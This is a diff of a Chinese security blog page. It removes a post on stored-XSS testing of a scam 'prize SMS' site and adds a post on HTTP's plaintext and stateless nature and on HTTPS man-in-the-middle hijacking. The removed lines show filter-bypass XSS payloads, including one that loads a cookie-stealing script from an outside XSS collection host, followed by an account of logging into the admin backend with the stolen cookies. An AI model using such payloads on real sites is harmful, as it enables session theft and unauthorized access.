@@ -64,7 +64,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="存储型xss,XSS绕过," />
+  <meta name="keywords" content="HTTP协议," />
 
 
 
@@ -80,23 +80,43 @@
 
 
 
-<meta name="description" content="起因 前几天上课的时候，忽然收到一条短信">
+<meta name="description" content="Http协议基础-明文特点http协议本身有以下特点：
+七层的应用层协议。
+是明文协议
+
+无内建的机密性安全机制
+嗅探或代理阶段可查看全部明文信息
+https只能提高传输层安全
+
+中间人基于https侦听劫持一样可以实现中间人攻击
+https劫持访问https网站时会发送相应的请求，服务器端会将公钥证书传给客户端，客户端会生成一个对称密钥用于加密之后所有的数据，对称密钥不会传输，会用证书里面服务器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一次收到”中奖短信“后的XSS测试">
-<meta property="og:url" content="http://yoursite.com/2016/04/18/一次收到”中奖短信“后的XSS测试/index.html">
+<meta property="og:title" content="第 2 章 ： HTTP协议 ">
+<meta property="og:url" content="http://yoursite.com/2016/07/24/第-2-章-：-HTTP协议/index.html">
 <meta property="og:site_name" content="Myh4ck1ife">
-<meta property="og:description" content="起因 前几天上课的时候，忽然收到一条短信">
-<meta property="og:image" content="http://i.imgur.com/y3VFOAV.png">
-<meta property="og:image" content="http://i.imgur.com/WlRIEj7.png">
-<meta property="og:image" content="http://i.imgur.com/0mP4BSq.png">
-<meta property="og:image" content="http://i.imgur.com/MgJdLJ0.png">
-<meta property="og:image" content="http://i.imgur.com/bp1fPEJ.png">
-<meta property="og:image" content="http://i.imgur.com/Ab0xqhD.png">
-<meta property="og:updated_time" content="2016-04-18T11:07:03.354Z">
+<meta property="og:description" content="Http协议基础-明文特点http协议本身有以下特点：
+七层的应用层协议。
+是明文协议
+
+无内建的机密性安全机制
+嗅探或代理阶段可查看全部明文信息
+https只能提高传输层安全
+
+中间人基于https侦听劫持一样可以实现中间人攻击
+https劫持访问https网站时会发送相应的请求，服务器端会将公钥证书传给客户端，客户端会生成一个对称密钥用于加密之后所有的数据，对称密钥不会传输，会用证书里面服务器">
+<meta property="og:updated_time" content="2016-07-24T07:55:22.439Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一次收到”中奖短信“后的XSS测试">
-<meta name="twitter:description" content="起因 前几天上课的时候，忽然收到一条短信">
-<meta name="twitter:image" content="http://i.imgur.com/y3VFOAV.png">
+<meta name="twitter:title" content="第 2 章 ： HTTP协议 ">
+<meta name="twitter:description" content="Http协议基础-明文特点http协议本身有以下特点：
+七层的应用层协议。
+是明文协议
+
+无内建的机密性安全机制
+嗅探或代理阶段可查看全部明文信息
+https只能提高传输层安全
+
+中间人基于https侦听劫持一样可以实现中间人攻击
+https劫持访问https网站时会发送相应的请求，服务器端会将公钥证书传给客户端，客户端会生成一个对称密钥用于加密之后所有的数据，对称密钥不会传输，会用证书里面服务器">
 
 
 
@@ -114,7 +134,7 @@
   };
 </script>
 
-  <title> 一次收到”中奖短信“后的XSS测试 | Myh4ck1ife </title>
+  <title> 第 2 章 ： HTTP协议  | Myh4ck1ife </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -254,7 +274,7 @@
             
             
               
-                一次收到”中奖短信“后的XSS测试
+                第 2 章 ： HTTP协议 
               
             
           </h1>
@@ -266,8 +286,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-04-18T18:21:26+08:00" content="2016-04-18">
-              2016-04-18
+            <time itemprop="dateCreated" datetime="2016-07-24T15:25:16+08:00" content="2016-07-24">
+              2016-07-24
             </time>
           </span>
 
@@ -280,8 +300,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/hack-life/" itemprop="url" rel="index">
-                    <span itemprop="name">hack_life</span>
+                  <a href="/categories/Kali实战-Web渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali实战-Web渗透</span>
                   </a>
                 </span>
 
@@ -296,8 +316,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/04/18/一次收到”中奖短信“后的XSS测试/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/04/18/一次收到”中奖短信“后的XSS测试/" itemprop="commentsCount"></span>
+                <a href="/2016/07/24/第-2-章-：-HTTP协议/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/24/第-2-章-：-HTTP协议/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -320,33 +340,26 @@
       
 
       
-        <h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p> 前几天上课的时候，忽然收到一条短信</p>
-<p><img src="http://i.imgur.com/y3VFOAV.png" alt=""></p>
-<a id="more"></a>
-<p> 打开网址如下：</p>
-<p><img src="http://i.imgur.com/WlRIEj7.png" alt=""></p>
-<p> 既然我有如此“运气”，就让我看看葫芦里卖的什么药吧！</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p> 随手x了一句</p>
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre><p> 发现报错了，我以为是对“script整个标签”进行了过滤（后来发现仅仅是对script进行过滤），然后就进行继续尝试。</p>
-<pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
-</code></pre><p> 发现还是报错，然后考虑是不是只过滤script这个字符串，然后考虑用img标签进行尝试。</p>
-<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;&gt;
-</code></pre><p> 然后出现了我等待已久的弹窗</p>
-<p><img src="http://i.imgur.com/0mP4BSq.png" alt=""></p>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p> 然后中午回去准备添加盗取cookies的代码，结果发现怎么都过不去，有一个点一直想不通，就是不知道对方到底过滤了什么，然后js填进去一直报错，我就一直想不通怎么在onerror事件里面让js生效，后来请教了好多人，得到的结果一直是没办法，这个没什么可x的，得不到什么结果，然后就放在一旁了，结果今天在论天逛的时候，发现了Black-Hole他的一篇文章里面提到了<imgsrc=x onerror="appendChild(createElement('script')).src='js_url'">这种用法，我一下子眼前一亮，然后知道了怎么添加js。然后就是登陆平台添加了一下盗取cookies代码，然后结合上文对过滤猜测的失误，我在想是不是仅仅是对script这个字符串进行了过滤，然后把t换成了&amp;#116</imgsrc=x></p>
-<pre><code>&lt;img src=xonerror=appendChild(createElement (&apos;scrip&amp;#116&apos;)).src=&apos;http://xss.0exp.cn/VdYVBx?1448952953&apos;/&gt;
-</code></pre><p> 然后显示订单成功</p>
-<p><img src="http://i.imgur.com/MgJdLJ0.png" alt=""></p>
-<h2 id="得到cookies"><a href="#得到cookies" class="headerlink" title="得到cookies"></a>得到cookies</h2><p> 打进去以后不一会，就收到cookies了</p>
-<p><img src="http://i.imgur.com/bp1fPEJ.png" alt=""></p>
-<h2 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h2><p> 然后就拖入老兵，进行访问。</p>
-<p><img src="http://i.imgur.com/Ab0xqhD.png" alt=""></p>
-<h1 id="最后想说"><a href="#最后想说" class="headerlink" title="最后想说"></a>最后想说</h1><p> 本文只做个人技术总结，并无宣扬对厂商造成破坏之意，且本漏洞已提交至乌云并已公开：</p>
-<blockquote>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0157351" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0157351</a></p>
-</blockquote>
-<p>如有不妥之处，请联系我，必将配合删除，至此告之。</p>
+        <h1 id="Http协议基础-明文"><a href="#Http协议基础-明文" class="headerlink" title="Http协议基础-明文"></a>Http协议基础-明文</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>http协议本身有以下特点：</p>
+<p>七层的应用层协议。</p>
+<p><strong>是明文协议</strong></p>
+<ul>
+<li>无内建的机密性安全机制</li>
+<li>嗅探或代理阶段可查看全部明文信息</li>
+<li>https只能提高传输层安全</li>
+</ul>
+<p>中间人基于https侦听劫持一样可以实现中间人攻击</p>
+<h3 id="https劫持"><a href="#https劫持" class="headerlink" title="https劫持"></a>https劫持</h3><p>访问https网站时会发送相应的请求，服务器端会将公钥证书传给客户端，客户端会生成一个对称密钥用于加密之后所有的数据，对称密钥不会传输，会用证书里面服务器的公钥将其加密，然后发给服务器端，服务器有对应的私钥，可以得到相应数据，每次会话的对称密钥都是随机的，而且加密强度很大，而且存在时间短，安全性高。但是攻击者会在本机生成一个伪证书，与服务器的区别是私钥不同，其他是相同的，会将自身本身的公钥发给被劫持者的客户端，然后被劫持者会生成这个假数据的对称密钥，由于传过去的公钥是劫持者的公钥，因此劫持者用本身的私钥就可以对数据进行解密，从而进行了https劫持。</p>
+<p><strong>无状态</strong></p>
+<ul>
+<li>每一次客户端和服务器端的通信都是独立的过程</li>
+<li>WEB应用需要跟踪客户端会话(多部通讯)</li>
+<li>不使用cookie的应用，客户端每次请求都要重新身份验证（不现实)</li>
+<li>Session用于在于用户身份验证后跟踪用户行为踪迹<ul>
+<li>提高用户体验，但增加了攻击向量</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
@@ -367,9 +380,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/存储型xss/" rel="tag">#存储型xss</a>
-          
-            <a href="/tags/XSS绕过/" rel="tag">#XSS绕过</a>
+            <a href="/tags/HTTP协议/" rel="tag">#HTTP协议</a>
           
         </div>
       
@@ -378,17 +389,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/04/18/一毛钱买娃娃/" rel="next" title="一毛钱买娃娃">
-                <i class="fa fa-chevron-left"></i> 一毛钱买娃娃
+              <a href="/2016/07/14/第-1-章-：-概述/" rel="next" title="第 1 章 ： 概述 ">
+                <i class="fa fa-chevron-left"></i> 第 1 章 ： 概述 
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/04/18/shell基础-脚本执行方式/" rel="prev" title="shell基础-脚本执行方式">
-                shell基础-脚本执行方式 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -414,8 +421,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/04/18/一次收到”中奖短信“后的XSS测试/"
-           data-title="一次收到”中奖短信“后的XSS测试" data-url="http://yoursite.com/2016/04/18/一次收到”中奖短信“后的XSS测试/">
+      <div class="ds-thread" data-thread-key="2016/07/24/第-2-章-：-HTTP协议/"
+           data-title="第 2 章 ： HTTP协议 " data-url="http://yoursite.com/2016/07/24/第-2-章-：-HTTP协议/">
       </div>
     
   </div>
@@ -506,7 +513,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#起因"><span class="nav-number">1.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过程"><span class="nav-number">2.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">2.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过"><span class="nav-number">2.2.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#得到cookies"><span class="nav-number">2.3.</span> <span class="nav-text">得到cookies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆后台"><span class="nav-number">2.4.</span> <span class="nav-text">登陆后台</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#最后想说"><span class="nav-number">3.</span> <span class="nav-text">最后想说</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Http协议基础-明文"><span class="nav-number">1.</span> <span class="nav-text">Http协议基础-明文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#特点"><span class="nav-number">1.1.</span> <span class="nav-text">特点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#https劫持"><span class="nav-number">1.1.1.</span> <span class="nav-text">https劫持</span></a></li></ol></li></ol></li></ol></div>
             
           </div>
         </section>
